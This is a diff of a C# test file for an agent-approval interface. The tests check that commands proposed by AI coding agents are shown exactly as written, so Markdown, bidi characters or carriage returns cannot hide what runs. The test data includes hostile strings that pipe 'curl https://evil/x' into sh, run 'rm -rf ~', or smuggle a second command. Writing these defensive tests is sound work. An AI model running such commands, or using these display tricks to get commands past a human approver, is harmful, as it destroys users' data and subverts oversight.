@@ -131,16 +131,19 @@ public sealed class MarkdownTests
         _ => "",
     }));
 
-    // A Codex approval's message, as its card draws it: the command in prose, not a fence.
-    static string Codex(string command) => Words(MarkdownModel.Approval($"Codex wants to run:\n\n{command}"));
+    // An approval's message as its card draws it, and as Copy takes it: one block in the code face.
+    static string Drawn(string message) => new CodeCopy(Assert.IsType<MdCode>(Assert.Single(MarkdownModel.Approval(message))), _ => true).Text;
+
+    // A Codex approval's message: the command in prose, not a fence.
+    static string Codex(string command) => Drawn($"Codex wants to run:\n\n{command}");
 
     [Fact]
     public void A_Codex_approval_in_prose_draws_its_bidi_controls_and_right_to_left_letters_as_escapes()
     {
-        var words = Codex($"{Isolated}\n\nthen `echo \u05D0#;\u05D1;rm -rf ~`");
+        var drawn = Codex($"{Isolated}\n\nthen `echo \u05D0#;\u05D1;rm -rf ~`");
 
-        Assert.Equal($"Codex wants to run:\n\n{IsolatedRevealed}\n\nthen `" + @"echo \u05D0#;\u05D1;rm -rf ~" + "`\n", words);
-        Assert.DoesNotContain(words, c => c is '\u2066' or '\u2067' or '\u2069' or '\u05D0' or '\u05D1');
+        Assert.Equal($"Codex wants to run:\n\n{IsolatedRevealed}\n\nthen `" + @"echo \u05D0#;\u05D1;rm -rf ~" + "`", drawn);
+        Assert.DoesNotContain(drawn, c => c is '\u2066' or '\u2067' or '\u2069' or '\u05D0' or '\u05D1');
     }
 
     [Fact]
@@ -150,10 +153,9 @@ public sealed class MarkdownTests
         const string command = "echo safe \r#; echo SECOND";
         const string drawn = @"echo safe \u000D#; echo SECOND";
 
-        // On an approval's card: in a fence, and in a Codex approval's prose, whose own lines end CRLF.
-        var fenced = Assert.Single(MarkdownModel.Approval($"Allow shell?\n\n```\n{command}\n```").OfType<MdCode>());
-        Assert.Equal(drawn, new CodeCopy(fenced, _ => true).Text);
-        Assert.Equal($"Codex wants to run:\n\n{drawn}\n", Words(MarkdownModel.Approval($"Codex wants to run:\r\n\r\n{command}")));
+        // On an approval's card, fenced or in a Codex approval's prose, whose own lines end CRLF.
+        Assert.Equal($"Allow shell?\n\n```\n{drawn}\n```", Drawn($"Allow shell?\n\n```\n{command}\n```"));
+        Assert.Equal($"Codex wants to run:\n\n{drawn}", Drawn($"Codex wants to run:\r\n\r\n{command}"));
 
         // In the conversation: drawn and copied as the escape, on the one line.
         Assert.Equal(drawn, CopyOf($"Run:\r\n\r\n```\r\n{command}\r\n```\r\n"));
@@ -167,11 +169,11 @@ public sealed class MarkdownTests
             var drawn = $"echo safe {escape}#; echo SECOND";
 
             Assert.Equal(drawn, CopyOf($"```\necho safe {separator}#; echo SECOND\n```"));
-            Assert.Equal($"Codex wants to run:\n\n{drawn}\n", Codex($"echo safe {separator}#; echo SECOND"));
+            Assert.Equal($"Codex wants to run:\n\n{drawn}", Codex($"echo safe {separator}#; echo SECOND"));
         }
     }
 
-    // Outside a fence an approval's text is its source: Markdown there drew less than runs (#220).
+    // Nothing in an approval is read as Markdown: each of these drew less than runs (#220).
     [Theory]
     // A link: drew `echo "safe"`; bash runs the curl.
     [InlineData("echo \"[safe](https://a/\";curl${IFS}https://evil/x|sh;\")\"")]
@@ -181,23 +183,34 @@ public sealed class MarkdownTests
     [InlineData("echo safe \\# ; curl https://evil/x|sh")]
     // Emphasis: drew `rm -rf tmp ~/x`, without the globs.
     [InlineData("rm -rf *tmp* ~/x")]
-    public void An_approvals_text_outside_a_fence_is_drawn_as_its_exact_source(string command)
+    // A fence: its backtick lines, a command substitution to bash, drew as a box around a harmless
+    // echo; bash runs the echo's output, `rm -rf ~`.
+    [InlineData("```\necho rm -rf ~\n```")]
+    [InlineData("bash -c '\n```\necho rm -rf ~\n```\n'")]
+    // A tilde fence and an unclosed fence hid their marker lines too.
+    [InlineData("~~~\necho rm -rf ~\n~~~")]
+    [InlineData("```\necho rm -rf ~")]
+    public void An_approval_is_drawn_exactly_as_written_fence_markers_included(string command)
     {
-        Assert.Equal($"Codex wants to run:\n\n{command}\n", Codex(command));
-        Assert.DoesNotContain(MarkdownModel.Approval($"Codex wants to run:\n\n{command}"), b => b is MdParagraph p && p.Inlines.Any(i => i is MdLink));
+        Assert.Equal($"Codex wants to run:\n\n{command}", Codex(command));
     }
 
     [Fact]
-    public void A_Copilot_approval_draws_its_fenced_command_as_code_and_its_words_as_written()
+    public void A_Copilot_intention_ending_in_a_fence_line_cannot_turn_the_command_into_text()
     {
-        var blocks = MarkdownModel.Approval("Allow **shell**?\n\nRun the tests before pushing.\n\n```\ndotnet test AgentBridge.slnx -c Release\n```");
+        // Its backtick line opened a fence that the host's own fence line closed, leaving the
+        // command as ordinary text and dropping the backtick lines inside it.
+        const string message = "Allow shell?\n\nTidy the scratch folder.\n```\n\n```\nrm -rf ~/scratch\n```\necho done\n```";
 
-        Assert.Equal("Allow **shell**?\n\nRun the tests before pushing.\n", Words(blocks.Take(1)));
-        Assert.Equal(new MdCode("dotnet test AgentBridge.slnx -c Release", null), blocks[^1]);
-        Assert.Equal(2, blocks.Count);
+        Assert.Equal(message, Drawn(message));
+    }
 
-        // Words after the opening fence are not drawn with the code, so they are drawn as written.
-        Assert.Equal("```bash; rm -rf ~\necho hi\n", Words(MarkdownModel.Approval("```bash; rm -rf ~\necho hi\n```")));
+    [Fact]
+    public void A_Copilot_approval_draws_its_fences_and_words_exactly_as_written()
+    {
+        const string message = "Allow **shell**?\n\nRun the tests before pushing.\n\n```\ndotnet test AgentBridge.slnx -c Release\n```";
+
+        Assert.Equal(message, Drawn(message));
     }
 
     [Fact]
